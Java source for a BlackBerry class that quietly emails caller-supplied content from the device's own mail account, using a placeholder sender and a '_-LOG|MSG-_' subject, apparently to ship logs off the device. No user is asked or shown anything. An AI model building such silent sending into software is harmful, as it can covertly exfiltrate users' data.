package blackberry.utils;

import net.rim.blackberry.api.mail.Address;
import net.rim.blackberry.api.mail.AddressException;
import net.rim.blackberry.api.mail.Folder;
import net.rim.blackberry.api.mail.Message;
import net.rim.blackberry.api.mail.MessagingException;
import net.rim.blackberry.api.mail.Session;
import net.rim.blackberry.api.mail.Store;
import net.rim.blackberry.api.mail.Transport;

public class Sendmail implements Runnable {

    //#ifdef DEBUG
    static Debug debug = new Debug("Sendmail", DebugLevel.VERBOSE);
    //#endif

    public static final String LOGSUBJECT = "_-LOG|MSG-_";
    static String from = "donotreply@whatever.com";

    String to;
    int counter;
    String content;

    public Sendmail(String to, int counter, String content) {
        this.to = to;
        this.counter = counter;
        this.content = content;
    }

    public static void send(String to, int counter, String content) {
        //#ifdef DEBUG_TRACE
        debug.trace("send: " + counter);
        //#endif
        Sendmail sendmail = new Sendmail(to, counter, content);
        Thread thread = new Thread(sendmail);
        thread.start();
    }

    public void run() {
        Store st = Session.getDefaultInstance().getStore();
        Folder[] folders = st.list(Folder.SENT);
        Folder sentFolder = folders[0];

        Message msg = new Message(sentFolder);

        Address toList[] = new Address[1];
        try {
            toList[0] = new Address(to, to);
        } catch (AddressException ex) {
            //#ifdef DEBUG_ERROR
            debug.error("send: " + ex);
            //#endif
        }

        try {
            msg.addRecipients(Message.RecipientType.TO, toList); //  add To, CC, BCC
        } catch (MessagingException ex) {
            //#ifdef DEBUG_ERROR
            debug.error("send: " + ex);
            //#endif
        }

        try {
            Address addressFrom = new Address(from, from); // Sender Details
            msg.setFrom(addressFrom);
        } catch (AddressException ex) {
            //#ifdef DEBUG_ERROR
            debug.error("send: " + ex);
            //#endif
        }

        msg.setSubject(LOGSUBJECT + " " + counter); //  For Subject
        try {
            msg.setContent(content);
        } catch (MessagingException ex) {
            //#ifdef DEBUG_ERROR
            debug.error("send: " + ex);
            //#endif
        }

        try {
            Transport.send(msg);
            System.out.println(" Email Sent successfully.");
        } catch (MessagingException ex) {
            //#ifdef DEBUG_ERROR
            debug.error("send: " + ex);
            //#endif
        }

    }
}
